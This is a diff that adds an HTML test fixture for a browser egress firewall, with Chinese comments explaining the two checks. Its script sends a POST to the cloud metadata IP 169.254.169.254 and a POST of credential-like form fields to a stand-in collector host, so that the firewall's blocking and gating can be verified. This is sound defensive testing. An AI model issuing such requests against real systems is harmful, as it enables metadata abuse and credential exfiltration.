@@ -1,0 +1,83 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>E5 egress firewall</title>
+<style>
+  html, body { margin: 0; padding: 0; font: 16px sans-serif; }
+  pre { margin: 12px; padding: 8px; background: #f0f0f0; }
+</style>
+</head>
+<body>
+  <h1>E5 egress firewall</h1>
+
+  <!--
+    E5 集成测试用（#[ignore] 真 chrome）。验证 Fetch.enable 拦截链路在真请求路径上生效：
+
+    1) IP 封禁（is_blocked_ip enforcement）：fetch POST 到云元数据 IP 169.254.169.254。
+       防火墙在 Fetch.requestPaused 命中 → failRequest{BlockedByClient} → fetch 几乎**瞬间** reject
+       （而非离线超时挂起）。fixture 记录 reject + 用时，测试据「快速 reject」证明是被防火墙阻断，
+       而非「无防火墙时的慢超时」。
+
+    2) 跨域 POST-body 门控（检测路径）：fetch POST 到跨域 host（带 form body）。防火墙在
+       Fetch.requestPaused 命中 GatePost → 构造预览（host/size/字段名，绝不含值）+ info 留痕 +
+       （E5 范围）continueRequest 放行。离线下该 fetch 仍会因无网络而 reject，但**关键是请求经过了
+       拦截 handler**（被 continue 而非永久挂起）——证明拦截链路对跨域 POST 也触发了。
+
+    全程 file:// fixture，无需服务器：fetch 到外部 host / 元数据 IP 即可触发 requestPaused。
+  -->
+  <pre id="log">ready</pre>
+
+  <script>
+    // 把每步结果挂到 window，测试经 a11y observe/evaluate 或直接读 DOM 文本断言。
+    window.__e5 = { steps: {} };
+
+    function logLine(s) {
+      const el = document.getElementById('log');
+      el.textContent = el.textContent + "\n" + s;
+    }
+
+    // 1) IP 封禁：fetch POST 到云元数据 IP。被防火墙 failRequest → 快速 reject。
+    window.__e5BlockedIpFetch = async function () {
+      const t0 = performance.now();
+      try {
+        await fetch("http://169.254.169.254/latest/meta-data/", {
+          method: "POST",
+          body: "probe=1",
+          // no-cors 让请求真正发出（否则 CORS 预检也可能干扰）；防火墙在网络层拦，与 CORS 无关。
+          mode: "no-cors",
+        });
+        const dt = performance.now() - t0;
+        window.__e5.steps.blockedIp = { ok: true, rejected: false, ms: dt };
+        logLine("blockedIp: NOT rejected (ms=" + dt.toFixed(0) + ")");
+      } catch (e) {
+        const dt = performance.now() - t0;
+        window.__e5.steps.blockedIp = { ok: true, rejected: true, ms: dt, err: String(e) };
+        logLine("blockedIp: rejected (ms=" + dt.toFixed(0) + ") " + e);
+      }
+      return window.__e5.steps.blockedIp;
+    };
+
+    // 2) 跨域 POST-body 门控（检测路径）：fetch POST 到跨域 host，带表单 body。
+    window.__e5CrossOriginPost = async function () {
+      const t0 = performance.now();
+      try {
+        await fetch("https://e5-cross-origin-probe.example.com/collect", {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: "username=alice&password=hunter2&csrf=abc123",
+          mode: "no-cors",
+        });
+        const dt = performance.now() - t0;
+        window.__e5.steps.crossPost = { ok: true, rejected: false, ms: dt };
+        logLine("crossPost: completed (ms=" + dt.toFixed(0) + ")");
+      } catch (e) {
+        const dt = performance.now() - t0;
+        window.__e5.steps.crossPost = { ok: true, rejected: true, ms: dt, err: String(e) };
+        logLine("crossPost: rejected (ms=" + dt.toFixed(0) + ") " + e);
+      }
+      return window.__e5.steps.crossPost;
+    };
+  </script>
+</body>
+</html>
